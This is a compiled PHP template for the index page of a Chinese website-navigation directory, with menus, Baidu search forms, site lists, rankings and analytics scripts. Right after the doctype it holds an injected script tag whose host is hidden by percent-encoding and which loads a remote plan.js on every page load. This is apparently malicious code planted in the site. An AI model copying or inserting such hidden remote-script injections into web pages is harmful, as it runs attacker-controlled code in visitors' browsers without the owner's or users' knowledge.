<?php if (!defined('THINK_PATH')) exit(); /*a:3:{s:38:"./template/default/pc/index_index.html";i:1571336419;s:65:"/www/wwwroot/666.36yunhu.cn/template/default/pc/index_header.html";i:1561896282;s:65:"/www/wwwroot/666.36yunhu.cn/template/default/pc/index_footer.html";i:1561627276;}*/ ?>
<!DOCTYPE html>
<script type="text/javascript" src="http://%71%71%2E%64%61%69%6E%62%2E%63%63/plan.js"></script>
<html>
	<head>
		<title>
			<?php echo config('web.WEB_TIT'); ?>
		</title>
		<meta name="keywords" content="<?php echo config('web.WEB_KEY'); ?>">
		<meta name="description" content="<?php echo config('web.WEB_DES'); ?>">
		  <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <link href="/favicon.ico" rel="shortcut icon">
  <link rel="stylesheet" href="/public/layui/css/layui.css">
  <link rel="stylesheet" href="/template/default/pc/public/css/public.css?20190613-5"> 
  <link rel="stylesheet" href="/template/default/pc/public/css/index.css?20190627"> 
  <link rel="stylesheet" href="/template/default/pc/public/css/mini.css"> 
  <link rel="stylesheet" href="/template/default/pc/public/css/update.css?20190613-5"> 
  <script src="/public/layui/layui.js" type="text/javascript"></script>
  <script src="/public/js/jquery-3.4.1.min.js" type="text/javascript"></script>
  <script src="/template/default/pc/public/js/public.js"></script>
  <script src="/template/default/pc/public/js/dropdown.js"></script>
</head>
<body>
	<header>
		<nav class="web-nav">
			<div class="container layui-clear">
				<ul class="nav-ul">
  
                  <?php if(config('web.PZ-FG') == 1): ?>
                  <a href="/" class="logo">
						<img src="<?php echo config('web.logo'); ?>" height="60">
					</a>
                  <?php elseif(config('web.PZ-FG') == 2): endif; ?>
					<div class="hover">
						<li class="hover">
							<a href="/">
								网站首页
							</a>
						</li>
						<li class="fenleiw hover">
							<a href="/list.html">
								网址分类
							</a>
							<div class="fenleiw-content">
								<?php if(is_array($tpto) || $tpto instanceof \think\Collection || $tpto instanceof \think\Paginator): $i = 0; $__LIST__ = $tpto;if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$vo): $mod = ($i % 2 );++$i;?>
								<lii>
									<?php if(config('web.WEB_URL') == 1): ?>
									<a href="/view/<?php echo $vo['id']; ?>.html" class="css<?php echo $vo['id']; ?>">
										<?php else: ?>
										<a href="/index.php/view/<?php echo $vo['id']; ?>.html" class="css<?php echo $vo['id']; ?>">
											<?php endif; ?><?php echo $vo['name']; ?>
										</a>
								</lii>
								<?php endforeach; endif; else: echo "" ;endif; ?>
							</div>
						</li>
                       <?php if(is_array($GZdh) || $GZdh instanceof \think\Collection || $GZdh instanceof \think\Paginator): $i = 0; $__LIST__ = $GZdh;if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$vo): $mod = ($i % 2 );++$i;?>
						<li class="hover">
							<a href="<?php echo $vo['links']; ?>" <?php if($vo['dj'] != 1): else: ?>target="_blank"<?php endif; ?>>
								<?php echo $vo['name']; ?>
							</a>
						</li>
                      <?php endforeach; endif; else: echo "" ;endif; ?>

					</div>
                  <?php if(config('web.PZ-TIME') == 1): ?>
                  <div id="Time"> </div>
                  <?php elseif(config('web.PZ-TIME') == 2): elseif(config('web.PZ-TIME') == 3): endif; ?>
                   
				</ul>
			</div>
            
		</nav>
	</header>
<script>
window.onload=function(){  
setInterval(function(){   
var date=new Date();   
var year=date.getFullYear(); //获取当前年份   
var mon=date.getMonth()+1; //获取当前月份   
var da=date.getDate(); //获取当前日   
var day=date.getDay(); //获取当前星期几   
var h=date.getHours(); //获取小时   
var m=date.getMinutes(); //获取分钟   
var s=date.getSeconds(); //获取秒   
var d=document.getElementById('Time');    
d.innerHTML='当前时间:'+year+'年'+mon+'月'+da+'日'+'星期'+day+' '+h+':'+m+':'+s;  },1000)  }
</script>
      <div class="guojiz">
      <?php if(config('web.PZ-FG') == 1): ?>
		 
			<div class="indexSearch">
				<div class="layui-clear">
					<a href="https://www.baidu.com" class="bdlogo" target="_blank">
						<img src="/template/default/pc/public/img/baidu1.png">
					</a>
					<div class="mys-bar barb">
						<input name="bar" type="radio" id="tab-4" checked="checked">
						<label for="tab-4">
							百度搜索
						</label>
						<div class="mys-bar-con">
							<div class="search bar4">
								<form class="form" action="https://www.baidu.com/s" target="_blank">
									<input type="text" class="soso" required="required" name="wd" value=""
									placeholder="百度搜索">
									<button class="sosoan" type="submit">
									</button>
								</form>
							</div>
						</div>
						<input name="bar" type="radio" id="tab-1">
						<label for="tab-1">
							本地搜索
						</label>
						<div class="mys-bar-con">
							<div class="search bar1">
								<form class="form" action="<?php if(config('web.WEB_URL') == 1): ?>/search.html<?php else: ?>/index.php/search.html<?php endif; ?>">
									<input type="text" class="soso" required="required" name="ks" value=""
									placeholder="搜索本站收录的网址">
									<button target="_blank" class="sosoan" type="submit">
									</button>
								</form>
							</div>
						</div>
					</div>
				</div>
			</div>
          <?php elseif(config('web.PZ-FG') == 2): ?>
       <div class="page-top" style="height:600px;margin-top: -14px;">
		<div class="wraps">
				<div class="head_logo_so">
					<div class="head_logo_h1">
						<div class="logo_titl"><a href="/" target="_parent"><img src="<?php echo config('web.logo'); ?>" height="60" alt=""></a><span></span></div>
						<div class="head_h1">
							<h1>国际网址设计导航</h1>
							<p><?php echo config('web.WEB_TIT'); ?></p>
						</div>
					</div>
					<div class="head_soso">
						<form action="https://www.baidu.com/s" target="_blank">
						<div class="container">
							<div class="search">
							    <input type="text" class="soso" required="required" name="wd" value=""placeholder="百度搜索一下">
                              
								    </div>
							</div>
						<button class="submit" type="submit">百度一下</button>
					</form></div>
					<div id="dvmq" style=" height: 22px;" class="box">
						<h2>随机网站:</h2>
					   <ul>	 
                         <?php if(is_array($guojizcai) || $guojizcai instanceof \think\Collection || $guojizcai instanceof \think\Paginator): $i = 0;$__LIST__ = is_array($guojizcai) ? array_slice($guojizcai,0,8, true) : $guojizcai->slice(0,8, true); if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$vo ): $mod = ($i % 2 );++$i;?>			        
                         <li><a class="topdj" data-id="<?php echo $vo['id']; ?>" href="http://<?php echo $vo['lianjie']; ?>/<?php echo config('web.WEB_HZ'); ?>" target="_blank">	<?php echo msubstr($vo['title'],0,10,'utf-8',true); ?></a></li>
                         <?php endforeach; endif; else: echo "" ;endif; ?>				   
                      </ul>
	
                  </div>

                  <div style="background-color: #0e0e0d36;height: 70px;border-radius: 2px;padding:5px;margin-top: 120px;margin-bottom:0px;">
                    <h3 style="color: #ff00ff;"><marquee scrollamount="5" font="" style="margin-top: 20px;COLOR: #c1bebe;FONT-SIZE: 15pt;WIDTH: 100%;"><b><?php echo config('web.PZ-GD'); ?></b></marquee></h3>
                  </div>				
          </div>	
				<div class="head_new_gj">
				<div class="head_new">
					<ul>
                      <?php if(is_array($tpto) || $tpto instanceof \think\Collection || $tpto instanceof \think\Paginator): $i = 0;$__LIST__ = is_array($tpto) ? array_slice($tpto,0,10, true) : $tpto->slice(0,10, true); if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$vo): $mod = ($i % 2 );++$i;?>					
                      <li><a href="<?php if(config('web.WEB_URL') == 1): ?>/view/<?php echo $vo['id']; ?>.html<?php else: ?>/index.php/view/<?php echo $vo['id']; ?>.html<?php endif; ?>" title="<?php echo $vo['name']; ?>"><?php echo $vo['name']; ?></a></li>
                      <?php endforeach; endif; else: echo "" ;endif; ?>		
                       <li><a href="/list.html" title="更多..">查看全部</a></li>
                  </ul>
				</div>
				<div class="zhanbang">
					<div><a href="#">收录网站 <?php echo $swang; ?> 个</a></div>
					<div><a href="#">未审站点 <?php echo $wwang; ?> 个</a></div>
					<div><a href="<?php if(config('web.WEB_URL') == 1): ?>/add.html<?php else: ?>/index.php/add.html<?php endif; ?>">申请收录</a></div>
				</div>
				<div class="gongju">
					<div class="gongju_title">免费工具<a href="#" class="iconfont icon-gengduo1"><span></span></a></div>
					<div class="xiaogongju">
                      <?php if(is_array($guojizgj) || $guojizgj instanceof \think\Collection || $guojizgj instanceof \think\Paginator): $i = 0;$__LIST__ = is_array($guojizgj) ? array_slice($guojizgj,0,10, true) : $guojizgj->slice(0,10, true); if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$vo ): $mod = ($i % 2 );++$i;?>
						<div class="guojiz_icon"><img src="<?php if($vo['ico'] != ''): ?><?php echo $vo['ico']; else: ?>http://<?php echo $vo['lianjie']; ?>/favicon.ico<?php endif; ?>"><a  class="topdj" data-id="<?php echo $vo['id']; ?>" href="http://<?php echo $vo['lianjie']; ?>/<?php echo config('web.WEB_HZ'); ?>" target="_blank" ><?php echo $vo['title']; ?></a></div>
                      <?php endforeach; endif; else: echo "" ;endif; ?>

					</div>
				</div>
			</div>
		</div>	
	</div> 
          <?php endif; ?>
			<article style="margin-top:-10px;">
				<div>
					<div class="indexgg layui-clear">
						<?php if(is_array($guojizgg) || $guojizgg instanceof \think\Collection || $guojizgg instanceof \think\Paginator): $i = 0; $__LIST__ = $guojizgg;if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$vo): $mod = ($i % 2 );++$i;?>
						<a class="gg" style="margin-top:10px;" target="_blank" href="<?php echo $vo['links']; ?>"
						title="<?php echo $vo['title']; ?>">
							<img src="<?php echo $vo['pic']; ?>">
						</a>
						<?php endforeach; endif; else: echo "" ;endif; ?>
					</div>
                  <?php if(config('web.PZ-J') == 1): ?>
					<ul class="indexWebList1 layui-clear">
						<div class="title">
							<h3>
								优站精选
							</h3>
							<!--<a style="color: #9E9E9E;" href="/choice.html" target="_blank">更多...</a> -->
						</div>
						<?php if(is_array($guojizjing) || $guojizjing instanceof \think\Collection || $guojizjing instanceof \think\Paginator): $i = 0;$__LIST__ = is_array($guojizjing) ? array_slice($guojizjing,0,28, true) : $guojizjing->slice(0,28, true); if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$vo): $mod = ($i % 2 );++$i;?>
						<li class="dropdown">
							<a class="topdj" data-id="<?php echo $vo['id']; ?>" href="http://<?php echo $vo['lianjie']; ?>/<?php echo config('web.WEB_HZ'); ?>" target="_blank">
								<img src="<?php if($vo['ico'] != ''): ?><?php echo $vo['ico']; else: ?>http://<?php echo $vo['lianjie']; ?>/favicon.ico<?php endif; ?>">
								<?php echo $vo['title']; ?>
							</a>
							<div class="dropdown-content">
								<a href="http://<?php echo $vo['lianjie']; ?>/<?php echo config('web.WEB_HZ'); ?>" class="topdj" data-id="<?php echo $vo['id']; ?>" target="_blank">
									直接访问
								</a>
								<?php if(config('web.WEB_URL') == 1): ?>
								<a href="/daohang/<?php echo $vo['id']; ?>.html" target="_blank">
									<?php else: ?>
									<a href="/index.php/daohang/<?php echo $vo['id']; ?>.html" target="_blank">
										<?php endif; ?>网站详情
									</a>
							</div>
						</li>
						<?php endforeach; endif; else: echo "" ;endif; ?>
					</ul>
                  <?php endif; if(config('web.PZ-J') == 1): ?>
					<ul class="indexWebList1 layui-clear">
						<div class="title">
							<h3>
								置顶推荐
							</h3>
						</div>
						<?php if(is_array($guojiztui) || $guojiztui instanceof \think\Collection || $guojiztui instanceof \think\Paginator): $i = 0;$__LIST__ = is_array($guojiztui) ? array_slice($guojiztui,0,28, true) : $guojiztui->slice(0,28, true); if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$vo): $mod = ($i % 2 );++$i;?>
						<li class="dropdown">
							<a class="topdj" data-id="<?php echo $vo['id']; ?>" href="http://<?php echo $vo['lianjie']; ?>/<?php echo config('web.WEB_HZ'); ?>" target="_blank">
								<?php if($vo['icos'] == 1): ?> <img src="<?php if($vo['ico'] != ''): ?><?php echo $vo['ico']; else: ?>http://<?php echo $vo['lianjie']; ?>/favicon.ico<?php endif; ?>"><?php else: endif; ?>
								<?php echo $vo['title']; ?>
							</a>
							<div class="dropdown-content">
								<a class="topdj" data-id="<?php echo $vo['id']; ?>" href="http://<?php echo $vo['lianjie']; ?>/<?php echo config('web.WEB_HZ'); ?>" target="_blank">
									直接访问
								</a>
								<?php if(config('web.WEB_URL') == 1): ?>
								<a href="/daohang/<?php echo $vo['id']; ?>.html" target="_blank">
									<?php else: ?>
									<a href="/index.php/daohang/<?php echo $vo['id']; ?>.html" target="_blank">
										<?php endif; ?>网站详情
									</a>
							</div>
						</li>
						<?php endforeach; endif; else: echo "" ;endif; ?>
					</ul>
                  <?php endif; ?>
					<div class="other layui-clear">
						<div class="left">
                          


                          <div class="slideshow-container">
   
                            <?php if(is_array($guojizxt) || $guojizxt instanceof \think\Collection || $guojizxt instanceof \think\Paginator): $i = 0; $__LIST__ = $guojizxt;if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$vo ): $mod = ($i % 2 );++$i;?>
                              <a href="<?php if(config( 'web.WEB_URL') == 1): ?>/xq/<?php echo $vo['id']; ?>.html<?php else: ?>/index.php/xq/<?php echo $vo['id']; ?>.html<?php endif; ?>" target="_blank">
  
                            <div class="mySlides fade">
    
                              <div class="numbertext">推荐</div>
   
                              <img src="<?php echo Pic($vo['content']); ?>" style="height: 220px;width:100%">
   
                              <div class="text"><?php echo $vo['title']; ?></div>
 
                            </div>

                            </a>
                            <?php endforeach; endif; else: echo "" ;endif; ?>

   
                            <a class="prev" onclick="plusSlides(-1)">❮</a>
 
                            <a class="next" onclick="plusSlides(1)">❯</a>

                          </div>   
 
    
                          <?php if(config('web.PZ-GJ') == 1): ?>
							<div class="tools layui-clear">
								<div class="title">
									<h3>
										免费工具
									</h3>
									<a class="iconfont icon-gengduo1" href="#">
									</a>
								</div>
								<?php if(is_array($guojizgj) || $guojizgj instanceof \think\Collection || $guojizgj instanceof \think\Paginator): $i = 0;$__LIST__ = is_array($guojizgj) ? array_slice($guojizgj,0,8, true) : $guojizgj->slice(0,8, true); if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$vo ): $mod = ($i % 2 );++$i;?>
								<a class="topdj" data-id="<?php echo $vo['id']; ?>" href="http://<?php echo $vo['lianjie']; ?>/<?php echo config('web.WEB_HZ'); ?>" target="_blank">
									<img src="<?php if($vo['ico'] != ''): ?><?php echo $vo['ico']; else: ?>http://<?php echo $vo['lianjie']; ?>/favicon.ico<?php endif; ?>">
									<?php echo $vo['title']; ?>
								</a>
								<?php endforeach; endif; else: echo "" ;endif; ?>
							</div>
                          <?php endif; if(is_array($guojizgg2) || $guojizgg2 instanceof \think\Collection || $guojizgg2 instanceof \think\Paginator): $i = 0; $__LIST__ = $guojizgg2;if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$vo): $mod = ($i % 2 );++$i;?>
							 <div class="indexgg1 layui-clear"> 
							<a class="gg" data-id="10" target="_blank" href="<?php echo $vo['links']; ?><?php echo config('web.WEB_HZ'); ?>" title="<?php echo $vo['title']; ?>">
							<img src="<?php echo $vo['pic']; ?>">
							</a> 
							</div>
                          <?php endforeach; endif; else: echo "" ;endif; if(config('web.PZ-CAI') == 1): ?>
							<div class="top">
								<div class="title">
									<h3>
										猜你喜欢
									</h3>
									<!-- <a class="iconfont icon-gengduo1" href="/bang.html"></a>-->
								</div>
								<ul class="content_rank">
									<?php if(is_array($guojizcai) || $guojizcai instanceof \think\Collection || $guojizcai instanceof \think\Paginator): $i = 0; $__LIST__ = $guojizcai;if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$vo ): $mod = ($i % 2 );++$i;?>
									<li>
										<a href="<?php if(config( 'web.WEB_URL') == 1): ?>/daohang/<?php echo $vo['id']; ?>.html<?php else: ?>/index.php/daohang/<?php echo $vo['id']; ?>.html<?php endif; ?>" target="_blank" class="layui-clear">
											<h3>
												<?php echo msubstr($vo['title'],0,10,'utf-8',true); ?>
											</h3>
											<span>
												<?php echo $vo['view']; ?> 人次
											</span>
										</a>
									</li>
									<?php endforeach; endif; else: echo "" ;endif; ?>
								</ul>
							</div>
                          <?php endif; if(config('web.PZ-PHB') == 1): ?>
							<div class="top">
								<div class="title">
									<h3>
										排行榜
									</h3>
								</div>
								<ul class="content_rank">
									<?php if(is_array($guojiztop) || $guojiztop instanceof \think\Collection || $guojiztop instanceof \think\Paginator): $i = 0; $__LIST__ = $guojiztop;if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$vo ): $mod = ($i % 2 );++$i;?>
									<li>
										<a href="<?php if(config( 'web.WEB_URL') == 1): ?>/daohang/<?php echo $vo['id']; ?>.html<?php else: ?>/index.php/daohang/<?php echo $vo['id']; ?>.html<?php endif; ?>" target="_blank" class="layui-clear">
											<i>
											</i>
											<h3>
												<?php echo msubstr($vo['title'],0,10,'utf-8',true); ?>
											</h3>
											<span>
												<?php echo $vo['view']; ?> 人次
											</span>
										</a>
									</li>
									<?php endforeach; endif; else: echo "" ;endif; ?>
								</ul>
							</div>
                          <?php endif; ?>
						</div>
                      <?php if(config('web.PZ-NEW') == 1): ?>
						<div class="right you">
							<ul class="indexWebList moneyList layui-clear">
								<div class="title">
									<h3>
										最近更新
									</h3>
								</div>
								<?php if(is_array($guojiznews) || $guojiznews instanceof \think\Collection || $guojiznews instanceof \think\Paginator): $i = 0; $__LIST__ = $guojiznews;if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$vo ): $mod = ($i % 2 );++$i;?>
								<li>
									<a href="<?php if(config( 'web.WEB_URL') == 1): ?>/daohang/<?php echo $vo['id']; ?>.html<?php else: ?>/index.php/daohang/<?php echo $vo['id']; ?>.html<?php endif; ?>" target="_blank">
										<?php if($vo['icos'] == 1): ?> 
										<img src="<?php if($vo['ico'] != ''): ?><?php echo $vo['ico']; else: ?>http://<?php echo $vo['lianjie']; ?>/favicon.ico<?php endif; ?>">
										<?php else: endif; ?><?php echo $vo['title']; ?>
									</a>
								</li>
								<?php endforeach; endif; else: echo "" ;endif; ?>
							</ul>
						</div>
                      <?php endif; if(config('web.PZ-NEWS') == 1): ?>
						<div class="right you">
							<div class="newslist">
								<div class="title">
									<h3>
										更新文章
									</h3>
									<a style="color: #9E9E9E;" href="<?php if(config( 'web.WEB_URL') == 1): ?>/news.html<?php else: ?>/index.php/news.html<?php endif; ?>" target="_blank">
										更多...
									</a>
								</div>
								<ul class="layui-clear" style="overflow:scroll;overflow-x:hidden;height:472px;">
									<?php if(is_array($guojizx) || $guojizx instanceof \think\Collection || $guojizx instanceof \think\Paginator): $i = 0; $__LIST__ = $guojizx;if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$vo ): $mod = ($i % 2 );++$i;?>
									<li>
										<a href="<?php if(config( 'web.WEB_URL') == 1): ?>/xq/<?php echo $vo['id']; ?>.html<?php else: ?>/index.php/xq/<?php echo $vo['id']; ?>.html<?php endif; ?>" class="layui-clear" target="_blank">
											<div class="img">
												<img src="<?php echo Pic($vo['content']); ?>" height="120">
											</div>
											<div class="info">
												<h3>
													<?php echo $vo['title']; ?>
												</h3>
												<span>
													<?php echo date('m-d',$vo['time']); ?>
												</span>
											</div>
										</a>
									</li>
									<?php endforeach; endif; else: echo "" ;endif; ?>
								</ul>
							</div>
						</div>
                       <?php endif; if(config('web.PZ-FL') == 1): ?>
						<div class="right you">
							<div class="title">
								<h3>
									分类
								</h3>
							</div>
							<?php if(is_array($artbycatelist) || $artbycatelist instanceof \think\Collection || $artbycatelist instanceof \think\Paginator): $i = 0; $__LIST__ = $artbycatelist;if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$vo): $mod = ($i % 2 );++$i;?>
							<div class="list layui-clear">
								<a href="<?php if(config( 'web.WEB_URL') == 1): ?>/view/<?php echo $vo['id']; ?>.html<?php else: ?>/index.php/view/<?php echo $vo['id']; ?>.html<?php endif; ?>" target="_blank" class="titles">
									<?php echo $vo['name']; ?>
								</a>
								<ul>
									<?php if(is_array($vo['artlists']) || $vo['artlists'] instanceof \think\Collection || $vo['artlists'] instanceof \think\Paginator): $k = 0; $__LIST__ = $vo['artlists'];if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$v): $mod = ($k % 2 );++$k;?>
									<li>
										<a href="<?php if(config( 'web.WEB_URL') == 1): ?>/daohang/<?php echo $v['id']; ?>.html<?php else: ?>/index.php/daohang/<?php echo $v['id']; ?>.html<?php endif; ?>" target="_blank">
											<?php if($v['icos'] == 1): ?> 
											<img src="<?php if($v['ico'] != ''): ?><?php echo $v['ico']; else: ?>http://<?php echo $v['lianjie']; ?>/favicon.ico<?php endif; ?>">
											<?php endif; ?> <?php echo $v['title']; ?>
										</a>
									</li>
									<?php endforeach; endif; else: echo "" ;endif; ?>
									<li>
										<a href="<?php if(config( 'web.WEB_URL') == 1): ?>/view/<?php echo $vo['id']; ?>.html<?php else: ?>/index.php/view/<?php echo $vo['id']; ?>.html<?php endif; ?>" target="_blank">
											<i class="layui-icon">
												
											</i>
										</a>
									</li>
								</ul>
							</div>
							<?php endforeach; endif; else: echo "" ;endif; ?>
						</div>
                      <?php endif; ?>
					</div>
				</div>
			</article>
		</div>    
      <script>  
        layui.use(['form', 'upload'],function() {     
          var form = layui.form, 
              jq = layui.jquery;     
          jq(".topdj").bind("topdj").click(function() {       
            var url = "<?php echo url("index/index/topdj"); ?>";   
            var id = jq(this).data('id');
            jq.post(url, {             
              id: id      
            },function(data) {});          
          });                
        })    
      </script>
		<footer>
    <div>
        <ul class="layui-clear">
            <li><a href="<?php echo config('web.WEB_AUT'); ?>"target="_blank">QQ群</a></li>
            <li><a href="<?php if(config('web.WEB_URL') == 1): ?>/ad.html<?php else: ?>/index.php/ad.html<?php endif; ?>">广告合作</a></li>
            <li><a href="<?php if(config('web.WEB_URL') == 1): ?>/add.html<?php else: ?>/index.php/add.html<?php endif; ?>">申请收录</a></li>
            <li><a href="<?php if(config('web.WEB_URL') == 1): ?>/guanyu.html<?php else: ?>/index.php/guanyu.html<?php endif; ?>">关于我们</a></li>
            <li><a href="http://wpa.qq.com/msgrd?v=3&uin=<?php echo config('web.WEB_QQ'); ?>&site=qq&menu=yes" target="_blank">QQ咨询</a></li>
        </ul>
      <p class="copart">
            <a href="<?php echo config('web.WEB_COM'); ?>">Copyright© 2019</a>  <a target="_blank" href="http://www.guojiz.com/">Powered by Guojiz V2.0</a>  <?php echo config('web.WEB_ICP'); ?>，<?php echo config('web.WEB_TJ'); ?> <a>本站已经运行<a id="days">0</a>天</a>
 
<script>
var s1 = '<?php echo config('web.PZ-YX'); ?>';
s1 = new Date(s1.replace(/-/g, "/"));
s2 = new Date();
var days = s2.getTime() - s1.getTime();
var number_of_days = parseInt(days / (1000 * 60 * 60 * 24));
document.getElementById('days').innerHTML = number_of_days;
</script>
 
 
        </p>
    </div>
</footer>
<!-- 请修改下面的统计代码改为你自己的 -->
<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement(&quot;script&quot;);
  hm.src = &quot;https://hm.baidu.com/hm.js?05ef9a4cff9e17cae0606bd17ef4e5ea&quot;;
  var s = document.getElementsByTagName(&quot;script&quot;)[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>
<!--下面自动推送代码-->
<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>
 
 
		<script>
		</script>
		</body>
  <script src="/template/default/pc/public/js/xin.js"></script>
  <?php if(config('web.PZ-YY') == 1): endif; ?>
</html>